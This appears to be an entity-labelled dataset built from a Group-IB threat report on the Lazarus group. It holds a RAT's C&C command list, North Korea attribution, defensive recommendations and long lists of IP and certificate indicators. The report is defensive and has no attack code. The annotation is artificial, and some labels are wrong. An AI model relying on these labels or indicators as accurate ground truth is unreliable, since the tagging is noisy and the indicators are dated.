Group-IB_Lazarus,Client_RAT,malware
Group-IB_Lazarus," 
or ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," – should be 

embedded

 Two more arguments:
 –r (functionality has not been 

identified) and –s 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution15

This program may execute the following commands received from the C&C 
server:

Command Description

NONE Do not execute any commands

GINF Collect and send extensive 
system information about the 
PC

SLEP Do not execute any commands

HIBN Do not execute any commands

DRIV Get information about available 
disks in the system

DIRP List files with the specified 
extension

CHDR Change current directory

RUNX Get the user token

MOVE Rename specified file

FTIM Set the timestamps of the file 
%windir%/system32/kernel32.dll 
to the specified file

NEWF Create a new directory with the 
specified name

ZDWN Presumably download the file/
files

PEIN Inject code in the specified 
process

TCON Presumably connect to the 
specified network node

DIR List files in the selected 
directory

DIE Remove itself  
from the system

DEL Delete selected file

WIPE Delete the selected file and 
make it unrecoverable

UPLD Upload the file to C&C

SCFG Get a new bot configuration

DRIV Enumerate installed drivers

DOWN Download and run the file

CMDL Run the command and upload 
the result of its work to С&C

GCFG Download bot configuration

RUN Execute command

PVEW List running processes

PEEX Inject the code in the process 
explorer.exe

PKIL Terminate the process with the 
selected PID

DescriptionCommand

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution16

Due to analysis of ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," infrastructure, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists have detected 
that the attack was controlled from two IP addresses:

• ",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, belongs to an autonomous system ,O
Group-IB_Lazarus,China Netcom,org
Group-IB_Lazarus,". However, some 
sources indicate that the set of IPs ",O
Group-IB_Lazarus,210.52.109.0/24,ioc
Group-IB_Lazarus, is assigned to ,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,".

• ",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, refers to a North Korean Internet service provider. The ,O
Group-IB_Lazarus,Whois,software
Group-IB_Lazarus,"
service indicates that this address is allocated to the Potonggang District, 
perhaps coincidentally, where ",O
Group-IB_Lazarus,Natinal Defence Commission,org
Group-IB_Lazarus," is located — the 

highest military body in ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus,"

Through investigation of public information, we came across a TV report 
from a South Korean news agency ",O
Group-IB_Lazarus,Arirang News,org
Group-IB_Lazarus, dated ,O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus," 

On the screen behind the host, ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists noticed two IP addresses 
",O
Group-IB_Lazarus,175.45.178.19,ioc
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,175.45.178.97,ioc
Group-IB_Lazarus,", which had been used to control ",O
Group-IB_Lazarus,Ghost RAT,malware
Group-IB_Lazarus," 
malware. Both IP addresses are in the same set of IP addresses as an IP address 
",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, that was discovered by ,O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," specialists.

The ",O
Group-IB_Lazarus,South Korea’s National Police Agency,org
Group-IB_Lazarus," reportedly identified that the cyber-
attack had been performed from the unfinished North Korean Ryugyong hotel. 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," could not confirm this location attribution. 

ATTACK 
ORGANIZERS

3.1  Involvement  
of ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus," 

03

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution17

",O
Group-IB_Lazarus,1st Bureau Operations,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,2nd Bureau Reconnaissance,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,3rd Bureau Foreign Intelligence,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,5th Bureau Inter-Korea Dialogue,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,6th Bureau Technical,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,7th Bureau Rear Services,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,"

Starting in ",O
Group-IB_Lazarus,2016,timestamp
Group-IB_Lazarus,", the ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group tried to mask their activity by 
pretending to be Russian hackers: 

1. The ",O
Group-IB_Lazarus,Client_TrafficForwarder,malware
Group-IB_Lazarus," module includes debugging symbols and 
strings containing Russian words in descriptions of commands received by 
malware from the C&C server. 
 
It’s worth noting that ""Russian commands"" received from the server are 
not typical for a Russian native speaker, and in the case of the «poluchit» 
(to receive) command the meaning of the word contradicts the action (to 
send) it is intended for. 
 
 
  
 

2. To protect their executables, hackers used ",O
Group-IB_Lazarus,Enigma Protector,tool
Group-IB_Lazarus,", a commercial 
product, which was created by a Russian software developer.

3. Exploits for ",O
Group-IB_Lazarus,Flash,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,SilverLight,software
Group-IB_Lazarus," were borrowed from the sets of exploits 
created by Russian-speaking hackers. 

These techniques to mask attribution initially mislead some researchers 
conducting preliminary analysis.

3.2  Masquerading as Russian hackers

Poluchit (means ""to get"" in Russian)                Send a network address of the current 

Layer 2 server to the C&C server 

The ",O
Group-IB_Lazarus,DarkSeoul,threat_actor
Group-IB_Lazarus, group (aka ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,") is controlled by Bureau 121, a division of the 
",O
Group-IB_Lazarus,Reconnaissance General Bureau,org
Group-IB_Lazarus,", a ",O
Group-IB_Lazarus,North Korean intelligence agency,org
Group-IB_Lazarus,. ,O
Group-IB_Lazarus,Bureau 121,org
Group-IB_Lazarus," 
is responsible for conducting military cyber campaigns.



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution18

RECOMMENDATIONS04

Updates of software and operating systems

To prevent infection through execution of exploits, it is enough to update 
your ",O
Group-IB_Lazarus,Microsoft,software
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Adobe,software
Group-IB_Lazarus, software.The ,O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," group uses known and 
patched exploits, rather than leveraging 0day vulnerabilities. That’s why, 
even usual software updates did not allow attackers to infiltrate corporate 
networks. Unfortunately, some of the attacked ",O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus," did not comply with this 
requirement.

Network traffic analysis

Even if the criminals have managed to obtain access to the corporate 
network, the attack can still be successfully prevented. After intrusion into the 
company’s network hackers still need to find systems of their interest, and 
gain access to them. It takes days and even months sometimes, and this time 
should be used to detect the malicious activity.

Attackers use malicious programs that transfer data to the C&C server — 
Layer 1. Communications between the infected computer and the C&C server 
can be identified through network traffic analysis. All communications are 
encrypted, that is why you should use solutions that can detect network 
anomalies based on threat intelligence data.

Application whitelisting

Application whitelisting should be introduced into critical bank servers. This 
will prevent attackers from installing their remote control tools, monitoring 
financial transactions, and escalating privileges. It also helps to identify 
unauthorized attempts to run such malicious applications.

Checking indicators of compromise

The “Indicators of compromise” section contains current and historical 
intelligence data. With these indicators, you can check if your organization 
was, or is, under attack by ",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus,". The group uses legitimate compromised 
servers, that’s why these indicators can give false positives.

Response

And the most important thing: if you have detected trails of a targeted attack 
at any stage, you need to involve specialized companies for its analysis. 
Incorrect responses to the attack result in the attacker activity remaining 
partly undetected to enable criminals to achieve their goal — to steal money.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution19

ABOUT  
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," is one of the global leaders in preventing and investigating high-
tech crimes and online fraud. ",O
Group-IB_Lazarus,Since 2003,timestamp
Group-IB_Lazarus,", the company has been active in the 
field of computer forensics and information security, protecting the largest 
international companies against financial losses and reputational risks.

 
International honors

The company is recognized by ",O
Group-IB_Lazarus,Gartner,org
Group-IB_Lazarus," as a threat intelligence vendor with 
strong cyber security focus and the ability to provide leading insight to the 
Eastern European region and recommended by the ",O
Group-IB_Lazarus,Organization for Security and Co-operation in Europe,org
Group-IB_Lazarus, (,O
Group-IB_Lazarus,OSCE,org
Group-IB_Lazarus,). In ,O
Group-IB_Lazarus,2017,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,IDC,org
Group-IB_Lazarus, Report named ,O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," the 
leader of the Russian Threat Intelligence Services Market. The company is a 
member of the ",O
Group-IB_Lazarus,World Economic Forum,org
Group-IB_Lazarus," working group on cybersecurity.

 
Clients worldwide

Fortune 500 companies worldwide use ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," products and services. 
",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus, clients include top-tier ,O
Group-IB_Lazarus,banks,industry
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,financial,industry
Group-IB_Lazarus," institutions, ",O
Group-IB_Lazarus,FMCG brands,industry
Group-IB_Lazarus," 
and industrial corporations, ",O
Group-IB_Lazarus,oil,industry
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,gas,industry
Group-IB_Lazarus," companies, software and hardware 
vendors, ",O
Group-IB_Lazarus,telecommunications,industry
Group-IB_Lazarus, service providers the ,O
Group-IB_Lazarus,US,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Western Europe,country
Group-IB_Lazarus,", the 
",O
Group-IB_Lazarus,Middle East,country
Group-IB_Lazarus,", ",O
Group-IB_Lazarus,Asia,country
Group-IB_Lazarus, and ,O
Group-IB_Lazarus,Australia,country
Group-IB_Lazarus,".

 
CyberCrimeCon2017

Annual conference organized by ",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," aims to empower global threat 
intelligence exchange in one of the hottest spot on cybersecurity map. Be the 
first to discover key cybercrime trends and get a chance to interact with the 
global experts directly, both on and off stage.  
Learn more on 2017.group-ib.com



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution20

",O
Group-IB_Lazarus,Threat Intelligence,software
Group-IB_Lazarus,"

Learn about threats, leakages, 
attacks, and hacking activity 
before they can harm your 
business

",O
Group-IB_Lazarus,TDS Sensor,software
Group-IB_Lazarus,"  
+ ",O
Group-IB_Lazarus,TDS Polygon,software
Group-IB_Lazarus,"

Detect malicious incidents in 
your internal network to prevent 
attacks, intrusions, data leaks, and 
espionage

",O
Group-IB_Lazarus,Incident Response,software
Group-IB_Lazarus,"

CERT-GIB — 24/7 emergency 
response and effective incident 
management

",O
Group-IB_Lazarus,Secure Bank,software
Group-IB_Lazarus,"

Protect online payments by 
identifying fraud preparation and 
attempted execution on client 
devices

",O
Group-IB_Lazarus,Brand Protection,software
Group-IB_Lazarus,"

Prevent online brand abuse, 
manage reputational risks and 
reduce online counterfeit sales

",O
Group-IB_Lazarus,Computer Forensics and Investigation,software
Group-IB_Lazarus,"

The largest computer forensics 
laboratory in ",O
Group-IB_Lazarus,Eastern Europe,country
Group-IB_Lazarus," with 
150+ successful investigations 
worldwide

",O
Group-IB_Lazarus,Group-IB,org
Group-IB_Lazarus," products and services

Learn more on group-ib.com



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution21

5.1 IP addresses of attackers

5.2  IP addresses with  
",O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,"

INDICATORS  
OF COMPROMISE

IP Country Comment

",O
Group-IB_Lazarus,175.45.178.222,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus," Potonggang District, where ",O
Group-IB_Lazarus,Natinal Defence Commission,org
Group-IB_Lazarus," 
of ",O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus," is located

",O
Group-IB_Lazarus,210.52.109.22,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,North Korea,country
Group-IB_Lazarus, Located in the network of ,O
Group-IB_Lazarus,China Netcom,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,157.7.135.182,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus, VPN server with an agent ,O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Japan Network Information Center,org
Group-IB_Lazarus," installed

",O
Group-IB_Lazarus,202.101.36.45,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus, VPN server with an agent ,O
Group-IB_Lazarus,SoftEther VPN,tool
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,Shanghai Telecom,org
Group-IB_Lazarus," installed

IP Country Certificate name Comments

",O
Group-IB_Lazarus,157.7.135.182,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus, vpn140818026.softether.net ,O
Group-IB_Lazarus,Japan Network Information Center,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.101.36.45,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,China,country
Group-IB_Lazarus, vpn421337203.sedns.cn ,O
Group-IB_Lazarus,Shanghai Telecom,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.129.24.4,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Thailand,country
Group-IB_Lazarus, vpn334555897.softether.net ,O
Group-IB_Lazarus,CAT-Northeast Telecom,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,78.89.183.37,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Kuwait,country
Group-IB_Lazarus, vpn401107085.softether.net ,O
Group-IB_Lazarus,Wataniya Telecom,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.3.225.57,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,USA,country
Group-IB_Lazarus," vpn204475098.softether.net Dedicated server hosting

",country
Group-IB_Lazarus,207.162.24.86,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Canada,country
Group-IB_Lazarus, vpn311153980.softether.net ,O
Group-IB_Lazarus,Universite du Quebec,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,209.254.82.137,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,USA,country
Group-IB_Lazarus, vpn835666623.softether.net ,O
Group-IB_Lazarus,"PaeTec Communications, Inc. TELECOM",org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,77.241.47.234,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Russia,country
Group-IB_Lazarus, vpn656325103.softether.net ,O
Group-IB_Lazarus,tvoe.tv,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,173.198.127.221,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,USA,country
Group-IB_Lazarus, vpn154284736.softether.net ,O
Group-IB_Lazarus,Warner Bros. Entertainment Inc,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,180.18.169.69,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Japan,country
Group-IB_Lazarus, vpn839766209.softether.net ,O
Group-IB_Lazarus,Japan Network Information Center,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.197.217.5,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Italy,country
Group-IB_Lazarus, vpn844692605.softether.net ,O
Group-IB_Lazarus,Telecom Italia S.p.a.,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.123.92.101,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Taiwan,country
Group-IB_Lazarus, vpn147623034.softether.net ,O
Group-IB_Lazarus,Taiwan Network Information Center,org
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.121.120.229,ioc
Group-IB_Lazarus, ,O
Group-IB_Lazarus,Taiwan,country
Group-IB_Lazarus, vpn178828146.softether.net ,O
Group-IB_Lazarus,Taiwan Network Information Center,org
Group-IB_Lazarus,"

05

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution22

5.3 IP addresses used to control the C&C infrastructure

IP addresses of compromised  
hosts with ",O
Group-IB_Lazarus,ServerRAT,malware
Group-IB_Lazarus,"
Listens on port 3365

IP addresses of 
compromised hosts 
with PortForwarder
Redirects to port 443

IP addresses of compromised 
hosts with ",O
Group-IB_Lazarus,Backend_Listener,malware
Group-IB_Lazarus,"
Listens on ports 8080 and 
9090

",O
Group-IB_Lazarus,140.121.120.229,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,27.131.59.198,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,194.78.90.21,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.123.92.101,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.210.105.105,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.197.217.5,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,182.77.60.35,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,203.131.230.104,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,80.60.105.128,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,203.114.109.68,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,165.123.67.111,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,178.222.166.209,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.114.122.178,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,63.247.182.137,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.121.100.63,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,114.174.228.100,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.183.185.90,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,118.189.38.21,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,203.66.57.237,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,210.227.170.229,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,180.18.169.69,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,173.198.127.221,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,86.120.134.50,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,77.241.47.234,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,182.73.40.130,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,58.64.203.66,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,81.93.72.18,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,61.122.232.25,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,209.254.82.137,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,118.22.154.159,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,207.162.24.86,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,178.252.148.240,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,212.14.44.245,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,210.213.80.237,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,180.234.11.19,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,51.254.71.167,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,41.41.241.194,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.3.225.57,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,69.91.178.16,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,180.94.69.107,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,218.29.194.101,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.119.98.20,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,64.116.135.73,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.115.31.220,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,78.89.183.37,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,221.132.18.43,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,190.252.8.138,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.210.119.142,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,61.90.156.121,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,212.34.228.66,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,196.214.247.58,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,12.49.13.202,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,41.72.101.138,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,60.96.139.113,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,80.78.73.204,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,212.30.75.210,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,87.252.182.182,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,166.111.80.223,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.116.31.195,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,24.201.106.142,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,41.33.212.94,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.192.208.227,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,193.19.174.60,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,220.132.243.188,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,69.196.83.206,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,62.210.146.3,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,208.124.153.14,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.112.90.235,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,47.176.2.12,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,164.70.22.40,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,211.240.78.135,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.56.120.210,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,184.163.74.15,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,210.241.42.173,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,218.248.46.26,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,12.49.13.202,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.210.105.105,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.129.24.4,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,210.213.90.173,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,187.109.80.61,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,212.219.35.51,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,203.131.230.104,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,2.32.113.178,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,187.44.139.252,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,123.200.9.178,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,82.144.131.5,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.183.185.91,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,209.105.239.42,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,209.81.121.51,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.115.31.220,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,80.78.73.204,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.115.42.147,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,212.14.44.245,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,165.123.67.111,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,66.207.112.187,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,203.66.57.237,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.116.178.123,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.116.31.195,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,140.112.14.16,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,202.183.185.90,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,41.72.101.138,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,59.120.19.101,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,125.214.195.17,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,69.196.83.206,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,175.45.61.44,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,31.192.208.xxx,ioc
Group-IB_Lazarus,"



",O
Group-IB_Lazarus,Lazarus,threat_actor
Group-IB_Lazarus," arisen:  
architecture, tools, attribution23

Certificate thumbprint “Issued for” Field Issue date IP addresses where 
the certificate was 
detected

",O
Group-IB_Lazarus,de8166daca44cca2ef26031fd8a489222d8fa74c,ioc
Group-IB_Lazarus,"

www.longmusic.com/emailAddress=master@longmusic.com

",O
Group-IB_Lazarus,2017-02-09,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,12.49.13.202,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,31.210.105.105,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,b82ce23ef56fd59df2d54cd6ab0d097ec38a72bb,ioc
Group-IB_Lazarus,"

www.comtech.com/emailAddress=master@comtech.com

",O
Group-IB_Lazarus,2016-11-27,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,187.44.139.252,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,1f2ae52ccf5ace9a27f521043816f8ca02405779,ioc
Group-IB_Lazarus,"

www.fartit.com/emailAddress=master@fartit.com

",O
Group-IB_Lazarus,2016-11-08,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,210.213.90.173,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,187.109.80.61,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,212.219.35.51,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,6e55459ddbc666e5d6f89844f5d2a2647be426ca,ioc
Group-IB_Lazarus,"

www.wikaba.com/emailAddress=master@wikaba.com

",ioc
Group-IB_Lazarus,2016-11-07,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,202.129.24.4,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,d35da9d13883b3f0c575144b3cee58d5744a9e48,ioc
Group-IB_Lazarus,"

www.telecomm.com/emailAddress=consult@www.telecom.com

",O
Group-IB_Lazarus,2016-11-07,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,203.131.230.104,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,6bab9ca99fcdd465a56463a65122f9e7ba367219,ioc
Group-IB_Lazarus,"

www.instanthq.com/emailAddress=master@instanthq.com

",O
Group-IB_Lazarus,2016-11-01,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,2.32.113.178,ioc
Group-IB_Lazarus,"

",ioc
Group-IB_Lazarus,a8b0b4f42547aaf608f062c6f9aa1e3fb33caaf0,ioc
Group-IB_Lazarus,"

tradeboard.mefound.com/emailAddress=master@mefound.com

",O
Group-IB_Lazarus,2016-10-21,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,82.144.131.5,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,202.183.185.91,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,c84c214878ebbee35d853cb2f739f919238550a4,ioc
Group-IB_Lazarus,"

www.biolab.com/emailAddress=master@biolab.com

",O
Group-IB_Lazarus,2016-10-03,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,123.200.9.178,ioc
Group-IB_Lazarus,"

",O
Group-IB_Lazarus,935192f61d0a72cc24d01feab5a18de9a3837b42,ioc
Group-IB_Lazarus,"

www.resfinan.com/emailAddress=info@resfinan.com

",O
Group-IB_Lazarus,2016-08-18,timestamp
Group-IB_Lazarus, ,O
Group-IB_Lazarus,209.105.239.42,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,209.81.121.51,ioc
Group-IB_Lazarus,"
",O
Group-IB_Lazarus,182.77.60.35,ioc
Group-IB_Lazarus,"
",O
